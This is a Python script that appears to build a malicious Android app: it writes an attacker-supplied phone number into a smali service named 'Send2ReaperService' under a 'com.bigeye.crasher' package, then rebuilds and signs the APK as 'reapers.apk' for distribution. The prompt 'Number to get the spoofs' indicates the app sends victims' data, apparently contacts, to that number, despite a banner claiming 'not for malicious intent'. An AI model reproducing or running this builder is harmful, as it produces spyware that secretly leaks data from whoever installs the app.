import os, subprocess

dpath = os.path.join(os.getcwd(),"reap.apk")
dpath2 = os.path.join(os.path.expanduser("~"), 'storage', 'downloads','reapers.apk')
reaperfile = "Send2ReaperService.smali"
path = os.path.join(os.getcwd(),"contact/smali/com/bigeye/crasher", reaperfile)
def changeNum():
    try:
        number = int(input("Number to get the spoofs: "))
        if len(str(number)) < 9:
            print("please input the correct number")
        else:
            with open("rep.smali", "r") as f:
                cont = f.read()
                with open(f"{path}", "w") as f:
                    cost = f.write(cont.replace("+254111111111", str(number)))
                recompile()
                signApk()
                cleanup()
    except ValueError:
        print("please input phone number minus the (+)")


def recompile():
    process = subprocess.Popen(['apktool', 'b', 'contact', '--output',dpath],stdout=subprocess.PIPE,universal_newlines=True)
    while True:
        output = process.stdout.readline()
        print(output.strip())
        # Do something else
        return_code = process.poll()
        if return_code is not None:
            print('RETURN CODE', return_code)
            # Process has finished, read rest of the output
            for output in process.stdout.readlines():
                print(output.strip())
            break


def signApk():
    process = subprocess.Popen(["apksigner","keystore", dpath,dpath2],stdout=subprocess.PIPE,universal_newlines=True)
    while True:
        output = process.stdout.readline()
        print(output.strip())
        # Do something else
        return_code = process.poll()
        if return_code is not None:
            print('RETURN CODE', return_code)
            # Process has finished, read rest of the output
            for output in process.stdout.readlines():
                print(output.strip())
            break
def cleanup():
    try:
        os.remove(os.path.join(os.getcwd(),"keystore"))
        os.remove(os.path.join(os.getcwd(),"reap.apk"))
        print("Clean up complete")
    except FileNotFoundError as e:
        print("No clean up to be done")

def main():
    #fonts = ["block","bubble","digital","ivrit","mini","script","shadow","slant","small","smscript","smshadow","smslant","standard"]
    #random.shuffle(fonts)
    os.system("clear")
    os.system('echo  "\\e[1;31m\"')
    os.system('echo "\\e[1;32m\"')
    os.system('echo "\\e[1;32m\"')
    os.system('echo "\\e[1;34m          Created By a Freak\\e[0m"')
    os.system('echo "\\e[2;32m     not for malicious intent! \\e[0m"')
    os.system('echo "\\e[2;32m            WinterFreak \\e[0m"')
    os.system('echo "\\e[1;32m   Mail: winterfreak@protonmail.com \\e[0m"')
    print()

if __name__ == "__main__":
    main()
    #generateKey()
    changeNum()
    #recompile()
